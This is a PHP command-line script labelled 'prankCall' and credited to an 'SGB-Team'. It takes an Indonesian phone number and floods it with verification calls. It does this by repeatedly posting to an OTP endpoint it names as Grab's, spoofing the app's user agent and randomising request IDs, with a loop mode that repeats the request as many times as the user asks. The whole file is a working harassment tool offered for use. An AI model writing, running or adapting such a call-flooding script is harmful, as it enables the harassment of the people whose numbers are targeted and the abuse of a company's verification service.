<?php
function get(){
	return trim(fgets(STDIN));
}
class prankCall{
	public function __construct($no){
		$this->number = $no;
	}
	private function get(){
		return trim(fgets(STDIN));
	}
	private function correct($no){
		$cek = substr($no,0,2);
		if($cek=="08"){
			$no = "62".substr($no,1);
		}
		return $no;
	}
	private function ekse(){
		$no = $this->correct($this->number);
		$rand = rand(0123456,9999999);
		$rands = $this->randStr(12);
		$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
		$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
		$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
		$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
		$h[] = "Content-Type: application/x-www-form-urlencoded";
		$h[] = "Content-Length: ".strlen($post);
		$h[] = "Host: api.grab.com";
		$h[] = "Connection: close";
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$x = curl_exec($ch); curl_close($ch);
		$ekse = json_decode($x,true);
		if(empty($ekse['challengeID'])){
			echo "Gagal\n";
		}else{
			echo "Sukses\n";
		}
	}
	private function loop($many,$sleep=null){
		$a=0;
		$no = $this->correct($this->number);
		while($a<$many){
			$rand = rand(0123456,9999999);
			$rands = $this->randStr(12);
			$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
			$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
			$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
			$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
			$h[] = "Content-Type: application/x-www-form-urlencoded";
			$h[] = "Content-Length: ".strlen($post);
			$h[] = "Host: api.grab.com";
			$h[] = "Connection: close";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$x = curl_exec($ch); curl_close($ch);
			$ekse = json_decode($x,true);
			if(empty($ekse['challengeID'])){
				continue;
			}else{
				$nn = $a+1;
				echo "[$nn] Sukses\r";
				$a++;
			}
			if($sleep!=null) sleep($sleep);
			if($a>=$many) echo "\nCompleted!\n";
		}
	}
	private function randStr($l){
		$data = "abcdefghijklmnopqrstuvwxyz1234567890";
		$word = "";
		for($a=0;$a<$l;$a++){
			$word .= $data{rand(0,strlen($data)-1)};
		}
		return $word;
	}
	public function run(){
		while(true){
			echo "?Loop(y/n)		";
			$loop = $this->get();
			if($loop=="y" OR $loop=="n"){
				break;
			}else{
				echo "Jika ya jawab y jika tidak jawab n\n";
				continue;
			}
		}
		if($loop=="y"){
			echo "?Many			";
			$many = $this->get();
			$this->loop($many);
		}else{
			$this->ekse();
		}
	}
}
echo "#################################\n# Copyright : @xptra | SGB-Team #\n#################################\n";
echo "?Number			";
$no = get();
$n = new prankCall($no);
$n->run();
